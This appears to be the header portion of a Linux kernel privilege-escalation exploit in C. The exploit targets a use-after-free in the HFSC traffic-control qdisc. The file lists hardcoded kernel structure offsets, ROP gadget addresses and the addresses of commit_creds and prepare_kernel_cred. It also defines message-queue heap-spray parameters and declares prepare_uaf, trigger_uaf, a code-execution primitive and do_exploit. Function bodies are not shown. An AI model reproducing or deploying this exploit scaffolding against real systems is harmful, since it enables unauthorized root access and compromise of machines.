#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <bits/cpu-set.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <time.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <endian.h>
#include <sys/socket.h>
#include <linux/ipv6.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/if_link.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/xfrm.h>
#include <sys/msg.h>
#include <libmnl/libmnl.h>


#define CPU_ZERO(cpusetp) __CPU_ZERO_S (sizeof (cpu_set_t), cpusetp)
#define CPU_SET(cpu,cpusetp) __CPU_SET_S (cpu, sizeof (cpu_set_t), cpusetp)
#define __aligned(x) __attribute__((__aligned__(x)))

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint8_t u8;
typedef uint16_t u16;


static const int RB_RED = 0;
static const int RB_BLACK = 1;
static const char setgroups_proc_file_path[] = "/proc/self/setgroups";
static const char uid_map_proc_file_path[] = "/proc/self/uid_map";
static const char gid_map_proc_file_path[] = "/proc/self/gid_map";

static const u32 struct_hfsc_class_member_qdisc_offset = 152;
static const u32 struct_hfsc_class_member_el_node_offset = 104;
static const u32 struct_hfsc_class_member_cl_e_offset = 264;

static const u32 struct_Qdisc_member_dequeue_offset = 8;
static const u32 struct_Qdisc_member_gso_skb_offset = 128;


static const u32 struct_timer_list_member_function_offset = 24;



static const u32 struct_task_struct_member_fs_offset = 2088;


static u64 push_rbx_pop_rsp_pop_rbp = 0x8775c;
static u64 mov_qword_ptr_rax_rsi_ret = 0xa585f6;
static u64 mov_rdi_rax_rep_ret = 0x12b1aeb;
// static u64 pop_rdi_ret = 0x104dfdd;
static u64 pop_rcx_ret = 0x219f0f4; // add al, ch ; pop rcx ; ret

static u64 add_rax_rcx_ret = 0xe3df4;

static u64 pop_rbx_ret = 0x6f15b;  //$$
static u64 pop_rdi_ret = 0x6a05d; //$$
static u64 xchg_rdi_rax_ret = 0xe722b4;
static u64 pop_rdx_ret = 0x1436f12;
static u64 push_rdi_ret_0x12 = 0x22dda5;

static u64 push_r12_jmp_rdi = 0x1b641d4;
static u64 push_rdi_push_rdi_ret = 0x2efd9fa;
static u64 pop_rsp_pop_rbp_ret = 0x1e1dabe;
static u64 pop_rbp_pop_r12_ret = 0x100b986;

static u64 iretq_addr = 0xffffffff81000300; //$$

static u64 init_task = 0x2212940;
static u64 init_fs = 0x2691a80;
static u64 prepare_kernel_cred = 0x116560;
static u64 commit_creds = 0x116810;
static u64 mov_rax_rsp_ret = 0xe023ec + 0xffffffff81000000;

static u64 find_task_by_vpid = 0x10d720;
static u64 swapgs_restore_regs_and_return_to_usermode_nopop = 0xc00f90;

unsigned long user_cs, user_ss, user_rsp, user_rflags;

struct rb_node {
	unsigned long __rb_parent_color;
	struct rb_node *rb_right;
	struct rb_node *rb_left;
};
static_assert(sizeof(struct rb_node) == 24,
	"sizeof(struct rb_node) in exploit not equal to sizeof(struct rb_node) in kernel");

    struct callback_head {
        struct callback_head *next;
        void (*func)(struct callback_head *head);
    } __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head

static_assert(sizeof(struct callback_head) == 16,
    "sizeof(struct callback_head) in exploit not equal to sizeof(struct callback_head) in kernel");

struct sk_buff {
	u8 bytes[224];
};

struct sk_buff_list {
	struct sk_buff *next;
	struct sk_buff *prev;
};
struct sk_buff_head {
	union {
		struct {
			struct sk_buff *next;
			struct sk_buff *prev;
		};
		struct sk_buff_list list;
	};
	u32 qlen;
	int lock;
};


#define MSG_TEXT_SIZE 0x3c0
#define SPRAY_COUNT 256
#define SPRAY_PAYLOAD_SIZE (MSG_TEXT_SIZE * SPRAY_COUNT)
struct msg_buf{
	long mtype;
	char mtext[MSG_TEXT_SIZE];
};


typedef int key_t;

struct code_execution_primitive {
	struct mnl_socket *route_socket;
	int raw_packet_socket;
	char network_interface_name[IFNAMSIZ];
	int network_interface_ifindex;
	u32 qdisc_A_handle;
	u32 qdisc_B_handle;
	u32 qdisc_C_handle;
	u32 classid_A;
	u32 classid_B;
	// 新增 msg 消息队列用于堆喷
	int msg_key_A;        // 消息队列 ID 数组
	int msg_key_B;  
	int msg_key_Spray;  
	int msg_spray_count;        // 总共 spray 的数量
	size_t msg_size;            // 单个消息大小
};

/* error handling */
void unix_error(char *msg);
void mnl_socket_error(char *msg);

/* mnl socket wrapper */
struct mnl_socket *Mnl_socket_open(int bus);
void Mnl_socket_bind(struct mnl_socket *nl, unsigned int groups, pid_t pid);
ssize_t Mnl_socket_sendto(const struct mnl_socket *nl, const void *req, size_t siz);
ssize_t Mnl_socket_recvfrom(const struct mnl_socket *nl, void *buf, size_t siz);

#define va_end(v) __builtin_va_end(v)
#define va_start(v,l) __builtin_va_start(v,l)
void write_string_to_file(const char *file_path, const char *fmt, ...);
int Vasprintf(char **strp, const char *fmt, va_list ap);



int Open(const char *pathname, int flags, mode_t mode);
void pin_on_cpu(int core_id);
void setup_namespace(void);
void validate_route_socket_operation_success(struct mnl_socket *route_socket, u32 seq);
void send_packet_to_network_interface(int raw_packet_socket, int ifidx, void *data, size_t len);
void trigger_qdisc_enqueue(int packet_socket, int ifindex);
void trigger_qdisc_enqueue_with_bigger_packet(int packet_socket, int ifindex);
void network_interface_up(const char *ifname);
void create_dummy_network_interface(struct mnl_socket *route_socket, const char *ifname, u32 tx_queues, u32 mtu);
void delete_network_interface(struct mnl_socket *route_socket, int ifindex);
void create_hfsc_qdisc(
	struct mnl_socket *route_socket,
	int ifindex,
	u32 tcm_parent,
	u32 tcm_handle,
	const struct tc_hfsc_qopt *qopt
);
void change_hfsc_qdisc(
	struct mnl_socket *route_socket,
	int ifidx,
	u32 tcm_parent,
	u32 tcm_handle,
	const struct tc_hfsc_qopt *qopt
);
void create_hfsc_class(
	struct mnl_socket *route_socket,
	int ifindex,
	u32 tcm_parent,
	u32 tcm_handle,
	const struct tc_service_curve *rsc,
	const struct tc_service_curve *fsc,
	const struct tc_service_curve *usc
);
void change_hfsc_class(
	struct mnl_socket *route_socket,
	int ifindex,
	u32 tcm_parent,
	u32 tcm_handle,
	const struct tc_service_curve *rsc,
	const struct tc_service_curve *fsc,
	const struct tc_service_curve *usc
);
void change_hfsc_qdisc_route(
	struct mnl_socket *route_socket,
	int ifindex,
	u32 tcm_parent,
	u32 tcm_handle,
	u32 route_to_classid
);
void create_pfifo_head_drop_qdisc(
	struct mnl_socket *route_socket,
	int ifindex,
	u32 tcm_parent,
	u32 tcm_handle,
  const struct tc_fifo_qopt *ctl
);
void delete_qdisc(struct mnl_socket *route_socket, int ifindex, u32 tcm_parent, u32 tcm_handle);
void delete_tclass(struct mnl_socket *route_socket, int ifindex, u32 tcm_parent, u32 tcm_handle);


void prepare_uaf(
	struct mnl_socket *route_socket,
	int packet_socket,
	int ifindex,
	u32 qdisc_A_handle,
	u32 qdisc_B_handle,
	u32 qdisc_C_handle,
	u32 classid_A
);
static inline void trigger_uaf(struct mnl_socket *route_socket, int ifindex, u32 hfsc_classid);



void code_execution_primitive_init(
	struct code_execution_primitive *code_execution_primitive,
	const char *network_interface_name,
	u32 qdisc_A_handle,
	u32 qdisc_B_handle,
	u32 qdisc_C_handle,
	u32 classid_A,
	u32 classid_B,
	int msg_key_A,
	int msg_key_B,
	int msg_key_Spray
);


//u64 user_cs, user_ss, user_rsp, user_rflags;
#define MSG_KEY 0x1234
int spray_msgs(int *msqid_array, int count, void *payload, size_t size);
int recv_msg_from_kernel(uint8_t msg_key,char *buf, size_t size);
int send_msg_to_kernel(uint8_t msg_key, const char *data, size_t size);
uint64_t get_module_base(const char *modname);



void code_execution_primitive_setup_network_interface(struct code_execution_primitive *code_execution_primitive);
void code_execution_primitive_build_primitive(struct code_execution_primitive *code_execution_primitive);
void code_execution_primitive_trigger(struct code_execution_primitive *code_execution_primitive);

void save_state(void);
void win(void);
void update_kernel_address(u64 kernel_base);
void do_exploit(void);



